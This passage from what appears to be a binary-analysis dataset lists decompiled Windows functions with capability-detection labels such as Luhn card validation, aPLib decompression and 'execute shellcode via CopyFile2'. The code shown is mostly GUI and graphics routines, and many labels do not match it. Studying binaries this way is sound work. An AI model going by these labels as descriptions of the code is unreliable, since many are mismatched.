(*_sym.imp.GDI32.dll_CreateFontIndirectA)(&var_40h);\n    pcVar2 = _sym.imp.USER32.dll_GetDialogBaseUnits;\n    pcVar1 = _sym.imp.GDI32.dll_SelectObject;\n    if (var_44h == 0) {\n        uVar5 = (*_sym.imp.USER32.dll_GetDialogBaseUnits)();\n        uVar5 = uVar5 & 0xffff;\n        uVar6 = (*pcVar2)();\n        uVar6 = uVar6 >> 0x10;\n    }\n    else {\n        var_48h = (*_sym.imp.GDI32.dll_SelectObject)(uVar3, var_44h);\n        (*_sym.imp.GDI32.dll_GetTextMetricsA)(uVar3, &lptm);\n        uVar6 = var_78h + lptm;\n        (*_sym.imp.GDI32.dll_GetTextExtentPoint32A)\n                  (uVar3, \"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz\", 0x34, &var_50h);\n        uVar5 = (var_50h + 0x1a) / 0x34;\n        (*pcVar1)(uVar3, var_48h);\n        (*_sym.imp.GDI32.dll_DeleteObject)(var_44h);\n    }\n    (*_sym.imp.USER32.dll_ReleaseDC)(0, uVar3);\n    uVar3 = (*_sym.imp.KERNEL32.dll_MulDiv)(arg_10h, uVar5, 4);\n    *arg_18h = uVar3;\n    uVar3 = (*_sym.imp.KERNEL32.dll_MulDiv)(arg_14h, uVar6, 8);\n    arg_18h[1] = uVar3;\n    fcn.0041176c();\n    return;\n}\n",
        "token_count": 742
    },
    "0043a633": {
        "rules": [
            "hash data using murmur3/51beaa2d5a2f415db2ae4fc8ef819b72/938ec34b87fc49598ca2362852471498"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.0043a633(uint arg_8h, uint arg_ch)\n\n{\n    char cVar1;\n    int32_t in_ECX;\n    uint var_18h;\n    char var_10h;\n    uint var_fh;\n    uint var_4h;\n    \n    var_4h = *0x4640c8;\n    fcn.0043a1ad(arg_8h, &var_18h);\n    cVar1 = arg_ch >> 0x10;\n    if ((var_fh != arg_ch) || (var_10h != cVar1)) {\n        var_10h = cVar1;\n        var_fh._0_1_ = arg_ch;\n        fcn.0043a4b6(arg_8h, &var_18h);\n        *(in_ECX + 0x9c) = 1;\n    }\n    fcn.0041176c();\n    return;\n}\n",
        "token_count": 215
    },
    "0043a941": {
        "rules": [
            "hash data using murmur3/51beaa2d5a2f415db2ae4fc8ef819b72/938ec34b87fc49598ca2362852471498"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.0043a941(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    int32_t iVar1;\n    int32_t in_ECX;\n    uint var_2ch;\n    uint var_18h;\n    uint var_14h;\n    uchar var_10h;\n    uint var_fh;\n    uint var_4h;\n    \n    var_4h = *0x4640c8;\n    fcn.0043a1ad(arg_8h, &var_18h);\n    fcn.00411970(&var_2ch, &var_18h, 0x14);\n    var_14h = arg_ch;\n    var_18h = arg_14h;\n    var_fh._0_1_ = arg_10h;\n    var_10h = arg_10h >> 0x10;\n    iVar1 = fcn.00412110(&var_2ch, &var_18h, 0x14);\n    if (iVar1 != 0) {\n        fcn.0043a4b6(arg_8h, &var_18h);\n        *(in_ECX + 0x9c) = 1;\n    }\n    fcn.0041176c();\n    return;\n}\n",
        "token_count": 297
    },
    "0043ab3d": {
        "rules": [
            "hash data using murmur3/51beaa2d5a2f415db2ae4fc8ef819b72/938ec34b87fc49598ca2362852471498"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0043ab3d(int32_t *arg_8h, uint arg_ch)\n\n{\n    int32_t iVar1;\n    int32_t in_ECX;\n    uint uVar2;\n    int32_t iVar3;\n    uint var_4h;\n    \n    iVar3 = 0;\n    uVar2 = 0;\n    if (0x40046 < *0x463e34) {\n        uVar2 = fcn.0042dd19();\n        iVar3 = fcn.0042dd4d(0, 0x8800, 0);\n    }\n    iVar1 = fcn.0042b38f();\n    if (iVar1 != 0) {\n        *arg_8h = arg_ch;\n        arg_8h[1] = arg_ch >> 0x10;\n    }\n    if (iVar3 != 0) {\n        (*_sym.imp.USER32.dll_SetWindowLongA)(*(in_ECX + 0x1c), 0xfffffff0, uVar2);\n    }\n    return iVar1;\n}\n",
        "token_count": 238
    },
    "00444748": {
        "rules": [
            "hash data using murmur3/51beaa2d5a2f415db2ae4fc8ef819b72/938ec34b87fc49598ca2362852471498"
        ],
        "decompiled_code": "\nvoid fcn.00444748(void)\n\n{\n    uint8_t uVar1;\n    uint uVar2;\n    uint32_t uVar3;\n    uchar *puVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    int32_t iVar7;\n    int32_t iStack148;\n    int32_t iStack144;\n    uint8_t *puStack140;\n    uchar auStack136 [128];\n    uint uStack8;\n    \n    uStack8 = *0x4640c8;\n    uVar2 = (*_sym.imp.USER32.dll_GetMenuCheckMarkDimensions)();\n    iVar5 = uVar2;\n    iStack148 = uVar2 >> 0x10;\n    if (0x20 < iVar5) {\n        iVar5 = 0x20;\n    }\n    iVar6 = iVar5 + 0xf >> 4;\n    iVar7 = ((iVar5 + -4) / 2 + iVar6 * 0x10) - iVar5;\n    if (0xc < iVar7) {\n        iVar7 = 0xc;\n    }\n    if (0x20 < iStack148) {\n        iStack148 = 0x20;\n    }\n    fcn.00411850(auStack136, 0xff, 0x80);\n    puVar4 = auStack136 + (iStack148 + -6 >> 1) * iVar6 * 2;\n    puStack140 = 0x450998;\n    iStack144 = 5;\n    do {\n        uVar1 = *puStack140;\n        uVar3 = puStack140 & 0xffff0000;\n        puStack140 = puStack140 + 1;\n        uVar3 = ~((uVar3 | uVar1) << (iVar7 & 0x1f));\n        *puVar4 = uVar3 >> 8;\n        puVar4[1] = uVar3;\n        puVar4 = puVar4 + iVar6 * 2;\n        iStack144 = iStack144 + -1;\n    } while (iStack144 != 0);\n    *0x466df8 = (*_sym.imp.GDI32.dll_CreateBitmap)(iVar5, iStack148, 1, 1, auStack136);\n    if (*0x466df8 == 0) {\n        *0x466df8 = (*_sym.imp.USER32.dll_LoadBitmapA)(0, 0x7fe3);\n    }\n    fcn.0041176c();\n    return;\n}\n",
        "token_count": 549
    },
    "0042454f": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0042454f(uint arg_8h, uint arg_ch)\n\n{\n    int32_t in_ECX;\n    uint var_30h;\n    \n    fcn.004243d2(&var_30h, arg_8h, arg_ch);\n    (*_sym.imp.USER32.dll_SendMessageA)(*(in_ECX + 0x1c), 0x405, 0, &var_30h);\n    return;\n}\n",
        "token_count": 101
    },
    "004245b2": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004245b2(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t in_ECX;\n    uint var_30h;\n    uint var_20h;\n    \n    fcn.004243d2(&var_30h, arg_8h, arg_ch);\n    fcn.00411970(&var_20h, arg_10h, 0x10);\n    (*_sym.imp.USER32.dll_SendMessageA)(*(in_ECX + 0x1c), 0x406, 0, &var_30h);\n    return;\n}\n",
        "token_count": 137
    },
    "004245f4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004245f4(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t in_ECX;\n    uint var_30h;\n    uint var_ch;\n    \n    fcn.004243d2(&var_30h, arg_ch, arg_10h);\n    var_ch = arg_8h;\n    (*_sym.imp.USER32.dll_SendMessageA)(*(in_ECX + 0x1c), 0x40c, 0, &var_30h);\n    return;\n}\n",
        "token_count": 122
    },
    "00424a2d": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00424a2d(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t in_ECX;\n    uint var_30h;\n    uint var_ch;\n    \n    fcn.004243d2(&var_30h, arg_ch, arg_10h);\n    var_ch = fcn.004019c0(0x100);\n    (*_sym.imp.USER32.dll_SendMessageA)(*(in_ECX + 0x1c), 0x40b, 0, &var_30h);\n    fcn.004059a0(0xffffffff);\n    return;\n}\n",
        "token_count": 142
    },
    "0042cf40": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4"
        ],
        "decompiled_code": "\nbool __cdecl\nfcn.0042cf40(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch, uint arg_20h, \n            uint arg_24h, uint arg_28h, uint arg_2ch, uint arg_30h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t *in_ECX;\n    bool bVar3;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint lpWindowName;\n    uint lpClassName;\n    uint dwExStyle;\n    \n    dwExStyle = arg_8h;\n    lpClassName = arg_ch;\n    lpWindowName = arg_10h;\n    var_10h = arg_14h;\n    var_14h = arg_18h;\n    var_18h = arg_1ch;\n    var_1ch = arg_20h;\n    var_20h = arg_24h;\n    var_24h = arg_28h;\n    var_28h = arg_2ch;\n    iVar1 = fcn.00444bf8();\n    var_2ch = *(iVar1 + 8);\n    var_30h = arg_30h;\n    iVar1 = (**(*in_ECX + 100))(&var_30h);\n    if (iVar1 == 0) {\n        (**(*in_ECX + 0x114))();\n        bVar3 = false;\n    }\n    else {\n        fcn.0042cef4();\n        iVar1 = (*_sym.imp.USER32.dll_CreateWindowExA)\n                          (dwExStyle, lpClassName, lpWindowName, var_10h, var_14h, var_18h, var_1ch, var_20h, var_24h, \n                           var_28h, var_2ch, var_30h);\n        iVar2 = fcn.0042b4da();\n        if (iVar2 == 0) {\n            (**(*in_ECX + 0x114))();\n        }\n        bVar3 = iVar1 != 0;\n    }\n    return bVar3;\n}\n",
        "token_count": 525
    },
    "00448c36": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_60h\n\nvoid __cdecl fcn.00448c36(uint arg_8h, int32_t *arg_ch, int32_t *arg_10h)\n\n{\n    int32_t *piVar1;\n    code *pcVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint uVar5;\n    int32_t iVar6;\n    uint var_60h;\n    int32_t var_50h;\n    uint var_4ch;\n    uint var_44h;\n    uint var_40h;\n    uint var_4h;\n    \n    var_4h = *0x4640c8;\n    if (*arg_ch == 0) {\n        iVar3 = *arg_10h;\n        if (iVar3 == 1) {\ncode_r0x00448c85:\n            *arg_ch = iVar3;\n        }\n        else {\n            if (iVar3 == 2) {\n                (**0x4630b0)();\n                *arg_ch = 2;\n                iVar3 = (*_sym.imp.KERNEL32.dll_lstrlenW)(arg_10h[1]);\n                iVar3 = iVar3 * 2 + 2;\n                iVar6 = (*_sym.imp.ole32.dll_CoTaskMemAlloc)(iVar3);\n                arg_ch[1] = iVar6;\n                if (iVar6 != 0) {\n                    fcn.00411970(iVar6, arg_10h[1], iVar3);\n                }\n                goto code_r0x00448edb;\n            }\n            if (iVar3 == 4) {\n                piVar1 = arg_10h[1];\n                arg_ch[1] = piVar1;\n                (**(*piVar1 + 4))(piVar1);\n                *arg_ch = 4;\n                goto code_r0x00448edb;\n            }\n            if (iVar3 == 8) {\n                piVar1 = arg_10h[1];\n                arg_ch[1] = piVar1;\n                (**(*piVar1 + 4))(piVar1);\n                *arg_ch = 8;\n                goto code_r0x00448edb;\n            }\n            if (iVar3 != 0x10) {\n                if (iVar3 == 0x20) {\n                    var_50h = fcn.00448788(0, arg_10h[1]);\n                    if (var_50h != 0) {\n                        iVar6 = (*_sym.imp.KERNEL32.dll_GlobalLock)(var_50h);\n                        iVar4 = (*_sym.imp.GDI32.dll_CopyMetaFileA)(*(iVar6 + 0xc), 0);\n                        iVar3 = var_50h;\n                        *(iVar6 + 0xc) = iVar4;\n                        if (iVar4 == 0) {\n                            (*_sym.imp.KERNEL32.dll_GlobalUnlock)(var_50h);\n                            (*_sym.imp.KERNEL32.dll_GlobalFree)(var_50h);\n                        }\n                        else {\n                            (*_sym.imp.KERNEL32.dll_GlobalUnlock)(var_50h);\n                            arg_ch[1] = iVar3;\n                            *arg_ch = 0x20;\n                        }\n                    }\n                    goto code_r0x00448edb;\n                }\n                if (iVar3 != 0x40) goto code_r0x00448edb;\n                goto code_r0x00448c85;\n            }\n            *arg_ch = 0x10;\n        }\n        arg_ch[1] = 0;\n    }\n    iVar3 = *arg_10h;\n    if (iVar3 == 1) {\n        iVar3 = fcn.00448788(arg_ch[1], arg_10h[1]);\n        if (iVar3 != 0) {\n            arg_ch[1] = iVar3;\n        }\n    }\n    else if (iVar3 == 2) {\n        uVar5 = (**0x4630b0)();\n        pcVar2 = _sym.imp.KERNEL32.dll_lstrlenW;\n        var_50h = arg_ch[1];\n        if (var_50h == 0) {\n            var_50h = 0;\n        }\n        else {\n            iVar3 = (*_sym.imp.KERNEL32.dll_lstrlenW)(var_50h);\n            fcn.004112a0();\n            var_50h = fcn.0040a439(&var_50h, var_50h, iVar3 * 2 + 2, uVar5);\n        }\n        iVar3 = arg_10h[1];\n        if (iVar3 == 0) {\n            uVar5 = 0;\n        }\n        else {\n            iVar6 = (*pcVar2)(iVar3);\n            fcn.004112a0();\n            uVar5 = fcn.0040a439(&var_50h, iVar3, iVar6 * 2 + 2, uVar5);\n        }\n        (*_sym.imp.KERNEL32.dll_CopyFileA)(uVar5, var_50h, 0);\n    }\n    else if (iVar3 == 4) {\n        iVar3 = (**(*arg_10h[1] + 0x30))(arg_10h[1], &var_4ch, 1);\n        if (iVar3 == 0) {\n            var_50h = 0;\n            (**(*arg_ch[1] + 0x14))(arg_ch[1], 0, 0, 0, 0);\n            (**(*arg_10h[1] + 0x14))(arg_10h[1], 0, 0, 0, 0);\n            iVar3 = (**(*arg_10h[1] + 0x1c))(arg_10h[1], arg_ch[1], var_44h, var_40h, 0, 0);\n            if (iVar3 == 0) {\n                (**(*arg_ch[1] + 0x14))(arg_ch[1], 0, 0, 0, 0);\n                (**(*arg_10h[1] + 0x14))(arg_10h[1], 0, 0, 0, 0);\n            }\n        }\n    }\n    else if (iVar3 == 8) {\n        (**(*arg_10h[1] + 0x1c))(arg_10h[1], 0, 0, 0, arg_ch[1]);\n    }\n    else if (((iVar3 == 0x10) || (iVar3 == 0x40)) && (arg_ch[1] == 0)) {\n        iVar3 = (*_sym.imp.ole32.dll_OleDuplicateData)(arg_10h[1], arg_8h, 0);\n        arg_ch[1] = iVar3;\n    }\ncode_r0x00448edb:\n    fcn.0041176c();\n    return;\n}\n",
        "token_count": 1505
    },
    "00433c5b": {
        "rules": [
            "check OS version/56128ea24265487c97cb4913628bf489"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00433c5b(uint arg_8h, int32_t arg_ch, int32_t arg_10h, uint arg_14h, int32_t *arg_18h)\n\n{\n    uint16_t uVar1;\n    code *pcVar2;\n    int32_t iVar3;\n    uint uVar4;\n    uint uVar5;\n    uint var_3ch;\n    uint var_34h;\n    uint var_2ch;\n    uint var_24h;\n    uint var_1ch;\n    uint var_14h;\n    uint var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    uVar1 = *(arg_10h + 4);\n    if (uVar1 < 0x20c) {\n        if (uVar1 == 0x20b) {\n            fcn.0043324b(&var_ch, *(arg_10h + 8), *(arg_10h + 6));\n            return 1;\n        }\n        if (uVar1 == 0x1e) {\n            (**(*arg_18h + 0x1c))();\n            return 1;\n        }\n        if (uVar1 == 0x103) {\n            (**(*arg_18h + 0x34))(*(arg_10h + 6));\n            return 1;\n        }\n        if (uVar1 == 0x127) {\n            (**(*arg_18h + 0x20))(*(arg_10h + 6));\n            return 1;\n        }\n        if (uVar1 == 0x12d) {\n            uVar5 = *(arg_ch + *(arg_10h + 6) * 4);\n            iVar3 = (*_sym.imp.GDI32.dll_GetObjectType)(uVar5);\n            if (iVar3 == 0) {\n                var_4h = (*_sym.imp.GDI32.dll_GetStockObject)(0xd);\n                pcVar2 = _sym.imp.GDI32.dll_SelectObject;\n                uVar4 = (*_sym.imp.GDI32.dll_SelectObject)(arg_18h[1], var_4h);\n                var_8h = (*pcVar2)(arg_18h[1], uVar5);\n                if (var_8h == var_4h) {\n                    iVar3 = *arg_18h;\n                    uVar5 = fcn.00433a4b(uVar5);\n                    (**(iVar3 + 0x28))(uVar5);\n                    return 1;\n                }\n                (*pcVar2)(arg_18h[1], uVar4);\n                (*pcVar2)(arg_18h[1], var_8h);\n            }\n            else if (iVar3 == 6) {\n                iVar3 = *arg_18h;\n                uVar5 = fcn.00433a4b(uVar5);\n                (**(iVar3 + 0x28))(uVar5);\n                return 1;\n            }\n        }\n        else {\n            if (uVar1 == 0x201) {\n                (**(*arg_18h + 0x2c))(*(arg_10h + 6));\n                return 1;\n            }\n            if (uVar1 == 0x209) {\n                (**(*arg_18h + 0x30))(*(arg_10h + 6));\n                return 1;\n            }\n        }\n    }\n    else {\n        if (uVar1 == 0x20c) {\n            (**(*arg_18h + 0x48))(&var_3ch, *(arg_10h + 8), *(arg_10h + 6));\n            return 1;\n        }\n        if (uVar1 == 0x20d) {\n            (**(*arg_18h + 0x38))(&var_34h, *(arg_10h + 8), *(arg_10h + 6));\n            return 1;\n        }\n        if (uVar1 == 0x20e) {\n            (**(*arg_18h + 0x40))(&var_2ch, *(arg_10h + 8), *(arg_10h + 6));\n            return 1;\n        }\n        if (uVar1 == 0x211) {\n            (**(*arg_18h + 0x3c))(&var_24h, *(arg_10h + 8), *(arg_10h + 6));\n            return 1;\n        }\n        if (uVar1 == 0x410) {\n            (**(*arg_18h + 0x4c))(&var_1ch, *(arg_10h + 0xc), *(arg_10h + 10), *(arg_10h + 8), *(arg_10h + 6));\n            return 1;\n        }\n        if (uVar1 == 0x412) {\n            (**(*arg_18h + 0x44))(&var_14h, *(arg_10h + 0xc), *(arg_10h + 10), *(arg_10h + 8), *(arg_10h + 6));\n            return 1;\n        }\n    }\n    (*_sym.imp.GDI32.dll_PlayMetaFileRecord)(arg_8h, arg_ch, arg_10h, arg_14h);\n    return 1;\n}\n",
        "token_count": 1180
    },
    "0043fb9f": {
        "rules": [
            "check OS version/56128ea24265487c97cb4913628bf489"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.0043fb9f(int32_t param_1, int32_t param_2)\n\n{\n    uint uVar1;\n    \n    if ((((param_2 != 0) && (param_2 != 6)) && (param_2 != 7)) && ((param_2 != 8 && (param_2 != 4)))) {\n        uVar1 = (*_sym.imp.USER32.dll_GetLastActivePopup)(*(param_1 + 0x1c));\n        (*_sym.imp.USER32.dll_BringWindowToTop)(uVar1);\n    }\n    return;\n}\n",
        "token_count": 133
    },
    "004065c0": {
        "rules": [
            "decompress data using aPLib/06666ba0b6a14a5481e4ee6eb664d454"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004065c0(int32_t param_1)\n\n{\n    float fVar1;\n    uchar uVar2;\n    uchar uVar3;\n    uint32_t uVar4;\n    float10 fVar5;\n    uint32_t *puVar6;\n    uint32_t *puVar7;\n    uint32_t *puStack32;\n    uint32_t *puStack16;\n    \n    fcn.00401e70(0);\n    fcn.00401e90(*(param_1 + 0xf8), *(param_1 + 0xf9), *(param_1 + 0xfa));\n    fcn.00401ef0();\n    fcn.004022d0();\n    fVar5 = fcn.004022c0();\n    puVar6 = fVar5 * *0x44e530;\n    fVar5 = fcn.004022b0();\n    fVar1 = fVar5;\n    puVar7 = puVar6;\n    fcn.00401ec0(fVar1, 0x3f4ccccd, puVar6);\n    fcn.004022e0();\n    uVar2 = fcn.00402460();\n    uVar3 = fcn.00402450();\n    uVar4 = fcn.00402440();\n    *puStack16 = CONCAT11(uVar2, uVar3) << 8 | uVar4 & 0xff;\n    fcn.00401ec0(fVar1, 0x3f5eb852, puVar6);\n    fcn.004022e0();\n    uVar2 = fcn.00402460();\n    uVar3 = fcn.00402450();\n    uVar4 = fcn.00402440();\n    *puStack32 = CONCAT11(uVar2, uVar3) << 8 | uVar4 & 0xff;\n    fcn.00401ec0(fVar1, 0x3f6b851f, puVar6);\n    fcn.004022e0();\n    uVar2 = fcn.00402460();\n    uVar3 = fcn.00402450();\n    uVar4 = fcn.00402440();\n    *puVar7 = CONCAT11(uVar2, uVar3) << 8 | uVar4 & 0xff;\n    return;\n}\n",
        "token_count": 514
    },
    "00412fff": {
        "rules": [
            "decompress data using aPLib/06666ba0b6a14a5481e4ee6eb664d454"
        ],
        "decompiled_code": "\nuint8_t * __cdecl fcn.00412fff(uint8_t *arg_8h, uint32_t arg_ch)\n\n{\n    uint8_t uVar1;\n    uint16_t uVar2;\n    int32_t iVar3;\n    uint8_t uVar4;\n    uint8_t *puVar5;\n    uint8_t *puVar6;\n    bool bVar7;\n    \n    puVar5 = NULL;\n    iVar3 = fcn.00414501();\n    iVar3 = *(iVar3 + 0x60);\n    if (iVar3 != *0x46870c) {\n        iVar3 = fcn.00412c04();\n    }\n    if (*(iVar3 + 8) != 0) {\n        do {\n            uVar4 = *arg_8h;\n            if ((*(uVar4 + 0x1d + iVar3) & 4) == 0) {\n                bVar7 = arg_ch == uVar4;\ncode_r0x0041305a:\n                puVar6 = arg_8h;\n                if (bVar7) {\n                    puVar5 = arg_8h;\n                }\n            }\n            else {\n                puVar6 = arg_8h + 1;\n                uVar1 = *puVar6;\n                if (uVar1 == 0) {\n                    bVar7 = puVar5 == NULL;\n                    arg_8h = puVar6;\n                    uVar4 = uVar1;\n                    goto code_r0x0041305a;\n                }\n                uVar2 = CONCAT11(uVar4, uVar1);\n                uVar4 = uVar1;\n                if (arg_ch == uVar2) {\n                    puVar5 = arg_8h;\n                }\n            }\n            arg_8h = puVar6 + 1;\n            if (uVar4 == 0) {\n                return puVar5;\n            }\n        } while( true );\n    }\n    iVar3 = -1;\n    do {\n        puVar5 = arg_8h;\n        if (iVar3 == 0) break;\n        iVar3 = iVar3 + -1;\n        puVar5 = arg_8h + 1;\n        uVar4 = *arg_8h;\n        arg_8h = puVar5;\n    } while (uVar4 != 0);\n    iVar3 = -(iVar3 + 1);\n    puVar5 = puVar5 + -1;\n    do {\n        puVar6 = puVar5;\n        if (iVar3 == 0) break;\n        iVar3 = iVar3 + -1;\n        puVar6 = puVar5 + -1;\n        uVar4 = *puVar5;\n        puVar5 = puVar6;\n    } while (arg_ch != uVar4);\n    puVar6 = puVar6 + 1;\n    if (*puVar6 != arg_ch) {\n        puVar6 = NULL;\n    }\n    return puVar6;\n}\n",
        "token_count": 643
    },
    "00407100": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __fastcall fcn.00407100(int32_t param_1)\n\n{\n    int32_t *piVar1;\n    uint *puVar2;\n    int32_t iVar3;\n    uint uVar4;\n    int32_t iVar5;\n    uint uVar6;\n    int32_t iVar7;\n    int32_t iVar8;\n    int32_t iVar9;\n    code *pcVar10;\n    uint *in_FS_OFFSET;\n    uchar *puVar11;\n    uint uVar12;\n    int32_t *piVar13;\n    int32_t iVar14;\n    uchar *puVar15;\n    int32_t iStack396;\n    code *pcStack392;\n    int32_t iStack388;\n    uint uStack384;\n    uchar *puStack380;\n    uchar *puStack376;\n    uchar *puStack372;\n    code *pcStack368;\n    int32_t iStack364;\n    int32_t iStack360;\n    code *pcStack356;\n    int32_t iStack352;\n    int32_t iStack348;\n    int32_t iStack344;\n    uint uStack340;\n    uint uStack336;\n    uint uStack332;\n    int32_t iStack328;\n    uint uStack324;\n    uint uStack320;\n    int32_t iStack316;\n    uint uStack312;\n    uint uStack308;\n    uint uStack304;\n    int32_t iStack300;\n    uchar *puStack296;\n    uint uStack292;\n    uchar *puStack288;\n    uint uStack284;\n    uint uStack280;\n    uint uStack276;\n    uchar *puStack272;\n    int32_t iStack268;\n    uchar *puStack264;\n    code *pcStack260;\n    uint uStack256;\n    uchar *puStack252;\n    int32_t iStack248;\n    uint uStack244;\n    int32_t iStack240;\n    uchar *puStack220;\n    int32_t *piStack216;\n    uint uStack196;\n    uint uStack192;\n    uint uStack188;\n    uint uStack184;\n    int32_t iStack176;\n    uint uStack164;\n    uint uStack152;\n    uchar *puStack140;\n    int32_t *piStack112;\n    uint uStack100;\n    uint uStack96;\n    uint uStack92;\n    uint uStack88;\n    uchar auStack36 [8];\n    uchar auStack28 [4];\n    uchar uStack24;\n    uint uStack20;\n    uint uStack12;\n    uint uStack8;\n    int32_t iStack4;\n    \n    iStack4 = -1;\n    uStack8 = 0x44b1e1;\n    uStack12 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xfffffff4;\n    piVar1 = param_1 + 0x84;\n    puStack220 = &stack0xffffffe4;\n    piStack216 = piVar1;\n    piStack112 = piVar1;\n    (*_sym.imp.USER32.dll_CopyRect)();\n    iVar3 = iStack4;\n    puStack252 = &stack0xffffffdc;\n    fcn.00406ab0();\n    uStack20 = 0;\n    fcn.00433fce(0x76554c);\n    uVar12 = *(param_1 + 0x100);\n    uStack24 = 1;\n    iStack240 = 0x407184;\n    fcn.00433fce(uVar12);\n    auStack28[0] = 2;\n    iStack240 = 0x407195;\n    fcn.0043307e();\n    auStack28[0] = 3;\n    if (iVar3 != 0) {\n        iVar3 = *(iVar3 + 4);\n    }\n    uStack244 = 0x4071ab;\n    iStack240 = iVar3;\n    uStack244 = (*_sym.imp.GDI32.dll_CreateCompatibleDC)();\n    iStack248 = 0x4071b5;\n    fcn.0043375c();\n    iStack248 = param_1 + 0xe4;\n    if (iStack248 != 0) {\n        iStack248 = *(param_1 + 0xe8);\n    }\n    uStack256 = 0x4071cd;\n    iVar3 = fcn.00433b14();\n    puVar2 = param_1 + 0x94;\n    uStack100 = *puVar2;\n    uStack96 = *(param_1 + 0x98);\n    uStack92 = *(param_1 + 0x9c);\n    uStack88 = *(param_1 + 0xa0);\n    if (*(param_1 + 0x128) != 0) {\n        uStack256 = 1;\n        pcStack260 = 0x1;\n        puStack264 = &stack0xffffff9c;\n        iStack268 = 0x40721a;\n        (*_sym.imp.USER32.dll_OffsetRect)();\n    }\n    if (*(param_1 + 0x118) == 0) {\n        uStack256 = uStack164;\n        puStack264 = puStack140;\n        iStack268 = 0x407298;\n        pcStack260 = puVar2;\n        (*_sym.imp.USER32.dll_FrameRect)();\n    }\n    else {\n        uStack192 = *(param_1 + 0x98);\n        uStack196 = *puVar2;\n        uStack188 = *(param_1 + 0x9c);\n        uStack256 = 0xffffffff;\n        uStack184 = *(param_1 + 0xa0);\n        pcStack260 = 0xffffffff;\n        puStack264 = &stack0xffffff3c;\n        iStack268 = 0x40724e;\n        (*_sym.imp.USER32.dll_InflateRect)();\n        pcVar10 = _sym.imp.USER32.dll_FrameRect;\n        puStack272 = &stack0xffffff30;\n        uStack276 = uStack152;\n        uStack280 = 0x407265;\n        (*_sym.imp.USER32.dll_FrameRect)();\n        uStack280 = 1;\n        uStack284 = 1;\n        puStack288 = &stack0xffffff24;\n        uStack292 = 0x407274;\n        (*_sym.imp.USER32.dll_OffsetRect)();\n        uStack292 = uVar12;\n        puStack296 = &stack0xffffff18;\n        iStack300 = iStack176;\n        uStack304 = 0x407285;\n        (*pcVar10)();\n    }\n    iVar8 = *piVar1 + *(param_1 + 0x60);\n    iStack268 = (*(param_1 + 0x8c) + *(param_1 + 0x60) * -2) - *piVar1;\n    iStack364 = iVar8;\n    if (iVar3 != 0) {\n        uStack304 = *(iVar3 + 4);\n        uStack308 = uStack280;\n        uStack312 = 0x4072c3;\n        fcn.00433b14();\n    }\n    iVar3 = *(param_1 + 0x54) + *piVar1;\n    piVar1 = param_1 + 0x74;\n    *piVar1 = iVar3;\n    *(param_1 + 0x7c) = *(param_1 + 0x60) + iVar3;\n    *(param_1 + 0x78) = *(param_1 + 0x88);\n    *(param_1 + 0x80) = (*(param_1 + 0x90) - *(param_1 + 0x88)) + *(param_1 + 0x88);\n    uStack256 = 0;\n    pcStack260 = vtable.CBitmap.0;\n    uStack92 = CONCAT31(uStack92._1_3_, 4);\n    uStack304 = 0x40730c;\n    iVar3 = fcn.00444bf8();\n    uStack308 = *(iVar3 + 0xc);\n    uStack304 = 0xcb;\n    uStack312 = 0x40731b;\n    uStack312 = (*_sym.imp.USER32.dll_LoadBitmapA)();\n    iStack316 = 0x407325;\n    fcn.00433a59();\n    iStack316 = iStack268;\n    uStack320 = uStack292;\n    uStack324 = 0x407334;\n    uStack284 = fcn.00433b14();\n    iStack360 = *(param_1 + 0x60) / 2 + *piVar1;\n    puStack288 = puStack288 + iVar8;\n    uStack324 = 0xcc0020;\n    iStack348 = (*(param_1 + 0x90) - *(param_1 + 0x88)) + -1;\n    iStack352 = puStack288 - 